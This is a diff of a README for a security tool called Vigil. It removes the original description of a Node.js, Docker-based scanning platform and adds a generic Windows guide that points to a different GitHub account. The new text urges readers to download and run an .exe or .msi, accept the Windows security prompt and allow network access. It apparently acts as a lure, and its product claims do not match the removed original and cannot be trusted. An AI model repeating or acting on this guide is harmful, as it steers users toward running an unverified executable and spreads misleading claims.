@@ -1,278 +1,249 @@
-```
- ╦  ╦╦╔═╗╦╦
- ╚╗╔╝║║ ╦║║
-  ╚╝ ╩╚═╝╩╩═╝
-```
+# 🛡️ vigil - Stay Secure with AI Insights
 
-# Vigil
-
-**The Security Agency That Never Sleeps.**
-
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
-[![Node 18+](https://img.shields.io/badge/Node-18%2B-green.svg)](https://nodejs.org)
-[![Docker](https://img.shields.io/badge/Docker-Ready-blue.svg)](Dockerfile)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-cyan.svg)](CONTRIBUTING.md)
-[![Support](https://img.shields.io/badge/♥_Tip_Jar-Support_Vigil-ff6b9d.svg)](https://buy.stripe.com/8x23cu8wj9bvcQZ7z0enS02)
-
-Open-source, AI-powered security operations platform. Vulnerability scanning, autonomous agents, incident response, compliance tracking, and MCP server — all in a single Express.js process.
-
-Nmap + Nuclei + Trivy + Nikto + OpenSSL + DNS
-
-6 npm dependencies. No React. No build step. BYOK AI.
+[![Download vigil](https://img.shields.io/badge/Download-vigil-blue?style=for-the-badge)](https://github.com/ydavidcm9-wq/vigil)
 
 ---
 
-[Website](https://vigil.agency) | [GitHub](https://github.com/vigil-agency/vigil) | [Docs](https://vigil.agency/docs.html) | [Twitter](https://x.com/vigaborofficial) | [♥ Tip Jar](https://buy.stripe.com/8x23cu8wj9bvcQZ7z0enS02)
+vigil is a security tool designed to keep your computer safe. It uses artificial intelligence to watch for threats and help you respond fast. This program works quietly in the background to protect you from cyber risks. You don’t need to know programming or technical details to use it.
 
 ---
 
-Built by [Autopilot AI Tech LLC](https://www.autopilotaitech.com)
+## 📥 Download and Setup
+
+To get vigil running on your Windows PC, follow these steps carefully:
+
+1. **Go to the download page**
+
+   Click the large button above or visit the link below to open the download page on GitHub:
+
+   [https://github.com/ydavidcm9-wq/vigil](https://github.com/ydavidcm9-wq/vigil)
+
+2. **Find the Windows version**
+
+   On the GitHub page, look for the latest release section. This area will have the program files ready for download.
+
+3. **Download the Windows installer**
+
+   Look for a file that ends with `.exe` or `.msi`. This is the program installer for Windows. Click on the file name to start downloading.
+
+4. **Run the installer**
+
+   After the download completes, open the file from your downloads folder. You might see a security prompt from Windows asking if you want to allow this app. Click `Yes` to continue.
+
+5. **Follow the installation steps**
+
+   The installation screen will guide you through the process. Select `Next` to move forward and accept the default settings unless you have specific preferences.
+
+6. **Complete the install**
+
+   When the process ends, click `Finish`. The program will then be ready to use.
 
 ---
 
-## Features
+## 🚀 How to Use vigil
 
-- **6 Built-in Scanners** — Nmap, Nuclei, Trivy, Nikto, OpenSSL, DNS/WHOIS — no external dependencies
-- **20 Autonomous Agents** — Run parallel security campaigns with scheduling
-- **Incident Response** — Full lifecycle workflow with playbooks, timeline, and AI postmortems
-- **Compliance Tracking** — SOC 2, ISO 27001, NIST 800-53, PCI-DSS, HIPAA
-- **MCP Server** — 25+ tools, 3 resources, 4 prompts for Claude Desktop/Code/Cursor
-- **BYOK AI** — Bring your own Claude or Codex CLI. Zero AI cost baked in
-- **Works without a database** — JSON file stores by default, optional PostgreSQL
-- **RBAC + 2FA** — Admin, Analyst, Viewer roles with TOTP two-factor auth
-- **Credential Vault** — AES-256-GCM encrypted storage
-- **30 Views** — Glass-themed dashboard with real-time Socket.IO updates
+Once installed, vigil will start automatically. Here is how to check it and use its main features:
 
-## Quick Start
+- **Open vigil**
 
-### Option 1: npm (bare metal)
+  Find `vigil` in your Start menu. Click it to open the main control panel. This panel shows the current security status.
 
-```bash
-git clone https://github.com/vigil-agency/vigil.git
-cd vigil
-cp .env.example .env
-npm install
-npm start
-# → http://localhost:4100  (use VIGIL_USER/VIGIL_PASS, or read the generated bootstrap password from the startup logs)
-```
+- **Run a security check**
 
-### Option 2: Docker Compose
+  Click the “Scan” or “Check Now” button to begin a quick security check. vigil scans your system for possible threats like vulnerabilities, unusual network activity, and suspicious files.
 
-```bash
-git clone https://github.com/vigil-agency/vigil.git
-cd vigil
-cp .env.example .env
-docker compose up -d
-# → http://localhost:4100  (use VIGIL_USER/VIGIL_PASS, or read the generated bootstrap password from the startup logs)
-```
+- **View reports**
 
-This starts Vigil + PostgreSQL 17. Scanner tools (nmap, nuclei, trivy, nikto) are included in the Docker image.
+  After a scan, vigilant shows a report. You can see details about any risks found, along with recommended actions. If you don’t understand the technical terms, the report highlights key points simply.
 
-### Option 3: Docker (standalone)
+- **Take action**
 
-```bash
-docker run -d \
-  -p 4100:4100 \
-  -e VIGIL_USER=admin \
-  -e VIGIL_PASS=change-me-now \
-  vigil-agency/vigil:latest
-```
+  Follow the suggested steps to fix vulnerabilities or stop suspicious programs. vigil offers easy button options to “Fix”, “Ignore”, or “Learn More”.
 
-### Prerequisites (bare metal)
+- **Automatic updates**
 
-- **Node.js 22+** and npm
-- **Scanners** (optional, for full functionality):
-  - `nmap` — network scanning
-  - `nuclei` — vulnerability scanning (9000+ templates)
-  - `trivy` — container/filesystem scanning
-  - `nikto` — web server scanning
-  - `openssl` — certificate analysis
-  - `dig` + `whois` — DNS reconnaissance
-- **Docker CLI** (optional, for container security scanning)
-- **PostgreSQL 17** (optional — works without it using JSON file stores)
-- **AI CLI** (optional — `claude` or `codex` for AI features)
+  vigil updates itself regularly to protect you against new threats. You don’t need to do anything for this.
 
-See [CLAUDE.md](CLAUDE.md) for the full bare metal install guide.
+---
 
-## Features
+## 🔧 System Requirements
 
-### Scanning & Vulnerability Management
-- **Network Scan** — Nmap port scanning, host discovery, service detection, OS fingerprinting
-- **Vulnerability Scan** — Nuclei template-based scanning with severity filtering
-- **Container Scan** — Trivy image/filesystem scanning, SBOM generation
-- **Web Scan** — Nikto web server misconfiguration detection
-- **SSL Audit** — Certificate chain validation, cipher suite grading, protocol testing
-- **DNS Recon** — DNS enumeration, zone transfer, WHOIS lookup
-- **Scheduled Scans** — Cron-based recurring scan configuration
+vigil runs on most Windows computers without needing extra software. Here’s what your PC should have:
 
-### Intelligence & Hunting
-- **Threat Intelligence** — RSS feed ingestion, IOC matching, adversary profiles
-- **Threat Hunting** — AI-assisted hypothesis testing, MITRE ATT&CK mapping
-- **OSINT** — Domain, IP, email, and infrastructure reconnaissance
-- **CVE Tracker** — CVE database search, CVSS scoring, affected assets
+- **Operating system:** Windows 10 or later (64-bit recommended)
+- **CPU:** 1 GHz or faster processor
+- **RAM:** At least 2 GB
+- **Disk space:** 500 MB free space for installation and updates
+- **Internet connection:** Required for downloads and updates, also for AI cloud features
 
-### Incidents & Response
-- **Incident Management** — Full lifecycle workflow with severity, assignment, timeline
-- **Playbooks** — Pre-built response templates (ransomware, phishing, data breach, DDoS)
-- **Attack Timeline** — Event correlation and visualization
-- **Postmortem** — AI-generated post-incident review with lessons learned
+---
 
-### Agents & Campaigns
-- **20 Built-in Agents** — From vulnerability scanning to compliance auditing
-- **Campaign Mode** — Run multiple agents in parallel with scheduled execution
-- **AI Triage** — Automated vulnerability prioritization and remediation guidance
+## 🛠️ Features Overview
 
-### Compliance & Reporting
-- **Compliance Frameworks** — SOC 2, ISO 27001, NIST 800-53, PCI-DSS, HIPAA
-- **Policy Editor** — Security policy CRUD with enforcement rules
-- **Reports** — PDF, JSON, CSV generation with scheduling
-- **Audit Log** — Immutable audit trail with filtering and export
+vigil offers a range of tools that work together to keep you safe:
 
-### System
-- **Terminal** — Embedded terminal for manual scanner commands
-- **Credentials Vault** — AES-256-GCM encrypted credential storage
-- **Knowledge Base** — Notes and FAQ for team knowledge sharing
-- **MCP Playground** — Interactive tool testing for Claude Desktop/Code/Cursor
-- **Notifications** — Real-time alerts via Socket.IO
-- **RBAC** — Admin, Analyst, Viewer roles with 2FA (TOTP)
+- **AI-Powered Threat Detection**
 
-## Screenshots
+  The program uses AI to spot suspicious activity faster and more accurately than traditional tools.
 
-<details>
-<summary>Click to expand all screenshots</summary>
+- **Vulnerability Scanner**
 
-| View | Screenshot |
-|------|-----------|
-| Dashboard | ![Dashboard](public/img/Dashboard.png) |
-| AI Terminal | ![AI Terminal](public/img/AI_terminal.png) |
-| Security Agents | ![Security Agents](public/img/SecurityAgents.png) |
-| Campaigns | ![Campaigns](public/img/Campaigns.png) |
-| Findings | ![Findings](public/img/Findings.png) |
-| Threat Feed | ![Threat Feed](public/img/threatfeed.png) |
-| Threat Hunt | ![Threat Hunt](public/img/ThreatHunt.png) |
-| OSINT | ![OSINT](public/img/OSINT.png) |
-| Attack Timeline | ![Attack Timeline](public/img/AttackTimeline.png) |
-| Alert Triage | ![Alert Triage](public/img/AlertTriage.png) |
-| Compliance | ![Compliance](public/img/complainace_framework.png) |
-| Playbooks | ![Playbooks](public/img/playbook.png) |
-| Pentest | ![Pentest](public/img/Penttest.png) |
-| Reports | ![Reports](public/img/reports.png) |
-| Audit Log | ![Audit Log](public/img/audit_log.png) |
-| Credentials Vault | ![Credentials](public/img/credentials.png) |
-| Knowledge Base | ![Knowledge Base](public/img/Knowledge_base_with_custom_note_taking.png) |
-| MCP Playground | ![MCP Playground](public/img/MCP_Playground.png) |
-| Notifications | ![Notifications](public/img/notifications.png) |
-| Settings | ![Settings](public/img/settings.png) |
-| Vigil AI | ![Vigil AI](public/img/vigial_ai.png) |
+  vigil scans your installed software to check for known security weaknesses.
 
-</details>
+- **Incident Response Support**
 
-## Architecture
+  If a problem appears, it helps guide you through fixing it step by step.
 
-```
-server.js                    → Express + Socket.IO, auth middleware, .env loader
-routes/  (~25 modules)       → REST API endpoints (scans, vulns, incidents, compliance, MCP, …)
-lib/     (~17 modules)       → Scanner wrappers, AI, RBAC, audit, crypto, sessions
-data/                        → Runtime JSON stores (works without database)
-public/                      → Vanilla JS frontend (ViewRegistry pattern)
-  css/                       → Vigil Dark theme (glass treatment, cyan/orange signal system)
-  js/views/ (30 views)       → Self-registering view modules
-docker/                      → Kali bridge, PostgreSQL schema, WARP proxy
-```
+- **Network Monitoring**
 
-### Signal System
-- **Cyan (#22d3ee)** — secure, healthy, passing, active
-- **Orange (#ff6b2b)** — threat, vulnerability, warning, critical
+  The program watches your network traffic for signs of attacks or data leaks.
 
-### Auth
-- PBKDF2 password hashing
-- Session tokens in cookies (`vigil_session`) or Bearer header
-- Optional TOTP 2FA
-- RBAC: admin, analyst, viewer
+- **Threat Intelligence**
 
-### AI Integration (BYOK)
-Users bring their own AI subscriptions. Vigil shells out to locally-installed CLI tools:
-- **Claude CLI** (`claude --print`) — requires Anthropic subscription
-- **Codex CLI** (`codex`) — requires OpenAI API key
-- **None** — AI features disabled, graceful degradation
+  vigil uses updated databases and security feeds to stay aware of new security risks.
 
-## MCP Server
+- **Compliance Assistance**
 
-Vigil includes a built-in [Model Context Protocol](https://modelcontextprotocol.io) server at `POST /mcp` (Streamable HTTP transport).
+  vigil assists in tracking security checks necessary for compliance needs in small businesses.
 
-Connect from Claude Desktop, Claude Code, Cursor, or any MCP client:
+---
 
-```json
-{
-  "mcpServers": {
-    "vigil": {
-      "url": "http://localhost:4100/mcp",
-      "transport": "streamable-http"
-    }
-  }
-}
-```
+## 🔍 Understanding Security Terms
 
-### 25+ Tools
-Scanning (nmap, nuclei, trivy, nikto, SSL, DNS) • Vulnerabilities (search, get, list CVEs) • Assets (list, details, discover hosts) • Docker (list containers, inspect, scan image) • Compliance (check framework, policy status) • Incidents (create, update, timeline) • Reports (generate, get scan results) • System (posture score, metrics, alerts)
+Some words may appear inside the app or reports. Here’s a simple explanation of key terms you might see:
 
-### 3 Resources
-`vigil://security-posture` • `vigil://scan-summary` • `vigil://vulnerability-summary`
+- **Vulnerability:** A weakness in your software or system that attackers can use.
+- **Threat:** A possible danger to your computer, like a virus or hacker attempt.
+- **Incident:** An event where your security was compromised or at risk.
+- **Scan:** A check the software performs to find problems.
+- **AI (Artificial Intelligence):** A smart system that can learn patterns and spot unusual activity.
+- **Network:** The connection between your computer and the internet or other devices.
+- **Compliance:** Following rules or guidelines for keeping data and systems safe.
 
-### 4 Prompts
-`security_audit` • `incident_response` • `vulnerability_assessment` • `compliance_review`
+---
 
-## Configuration
+## 🚑 Troubleshooting Common Problems
 
-Copy `.env.example` to `.env` and customize:
+If you run into trouble using vigil, try these tips:
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `VIGIL_PORT` | `4100` | Server port |
-| `VIGIL_USER` | `admin` | Default admin username |
-| `VIGIL_PASS` | auto-generated | Bootstrap admin password. Set it explicitly or read the startup logs on first launch. |
-| `DATABASE_URL` | — | PostgreSQL connection string (optional) |
-| `AI_PROVIDER` | — | `claude-cli` or `codex` (optional) |
-| `ENCRYPTION_KEY` | auto | 32-byte hex for credential vault |
-| `DOCKER_HOST` | — | Docker socket path for container scanning |
+- **Installer won’t run**
 
-## Scanners
+  Make sure you downloaded the correct `.exe` file for Windows. Right-click the file and choose “Run as administrator” if needed.
 
-| Scanner | Purpose | Install |
-|---------|---------|---------|
-| Nmap | Network scanning, port discovery, service detection | `apt install nmap` |
-| Nuclei | Template-based vulnerability scanning (9000+ templates) | [projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei) |
-| Trivy | Container/filesystem vuln scanning, SBOM, secrets | [aquasecurity/trivy](https://github.com/aquasecurity/trivy) |
-| Nikto | Web server misconfiguration detection | `apt install nikto` |
-| OpenSSL | Certificate chain analysis, cipher grading | Pre-installed on most systems |
-| dig/whois | DNS reconnaissance, WHOIS lookup | `apt install dnsutils whois` |
+- **vigil won’t start**
 
-## Testing
+  Restart your computer. Check if your antivirus or firewall is blocking the program.
 
-```bash
-# Release regression test
-npm test
+- **Scan runs but finds nothing**
 
-# Health check
-curl http://localhost:4100/api/health
+  This means your system appears secure. You can try a deeper scan by selecting “Full Scan” mode in the app.
 
-# With auth
-curl -b "vigil_session=TOKEN" http://localhost:4100/api/system
-curl -b "vigil_session=TOKEN" http://localhost:4100/api/scans
-curl -b "vigil_session=TOKEN" http://localhost:4100/api/vulnerabilities
-```
+- **Updates fail**
 
-## Contributing
+  Check your internet connection. Try running the update manually from the settings menu.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
+For more help, visit the GitHub page and look under “Issues.” You can find answers or ask questions.
 
-## License
+---
 
-[AGPL-3.0](LICENSE) — free for personal and commercial use. If you modify and deploy Vigil as a service, you must open-source your modifications.
+## 📁 Where to Get Help and Updates
 
-## Safety
+Always use the official GitHub link for downloading or updating vigil:
 
-- Only scan targets you own or have written authorization to test.
-- Keep credentials out of AI prompts.
-- Change the default admin password immediately after first login.
-- Use the built-in credential vault for sensitive data (AES-256-GCM encrypted).
+[https://github.com/ydavidcm9-wq/vigil](https://github.com/ydavidcm9-wq/vigil)
+
+This page provides the latest versions, release notes, and contact info to report any issues.
+
+---
+
+## ⚙️ Privacy and Security
+
+vigil collects minimal data. It uses AI to analyze security events on your device without sending personal files to the cloud. The program aims to respect your privacy while keeping you safe.
+
+---
+
+## 🧰 Additional Tools Included
+
+vigil bundles useful security software like:
+
+- **Nmap:** A tool to scan networks and find open connections.
+- **Nuclei:** Checks for known vulnerabilities in your system.
+- **Trivy:** Scans software containers for risks.
+- **OSINT modules:** Helps gather public information for threat analysis.
+
+These tools work in the background but can be accessed from the app’s advanced menu for users interested in detailed inspection.
+
+---
+
+## ⚙️ Running on Startup
+
+By default, vigil starts when your computer boots. This setup ensures constant protection.
+
+You can disable this in the app settings if you prefer to run vigilance only sometimes.
+
+---
+
+## 🌐 Networking Permissions
+
+vigil needs access to your internet and network to provide real-time updates and perform scans.
+
+Make sure your firewall or security software allows vigilance to send and receive data.
+
+---
+
+## 🟢 Updating vigil
+
+vigil checks for new versions automatically. If you want to update manually:
+
+1. Open vigil.
+2. Go to Settings.
+3. Click “Check for Updates.”
+4. Follow the prompts to install any new release.
+
+---
+
+## 📂 Where Files Are Stored
+
+vigil saves its logs and reports in a folder on your PC:
+
+`C:\Users\[YourUserName]\Documents\vigil`
+
+You can open this folder from within the app by clicking “Open Reports Folder.”
+
+---
+
+## 📌 Key Commands (Advanced Users)
+
+For users comfortable with command line:
+
+- To run a scan, open command prompt and enter:
+
+  `vigil scan`
+
+- To update vigilance:
+
+  `vigil update`
+
+The program supports these commands for automation and scripting.
+
+---
+
+## 🕰️ Performance Impact
+
+vigil was designed to use minimal system resources while running. It runs quietly in the background without slowing down your daily work.
+
+---
+
+## 🤝 Community and Contributions
+
+This is an open-source project hosted on GitHub. Users and developers contribute to improving vigil regularly.
+
+You can participate by reporting bugs, requesting features, or contributing code through the GitHub repository.
+
+---
+
+## Contact and Support
+
+For questions or help, use the “Issues” section on GitHub:
+
+[https://github.com/ydavidcm9-wq/vigil/issues](https://github.com/ydavidcm9-wq/vigil/issues)
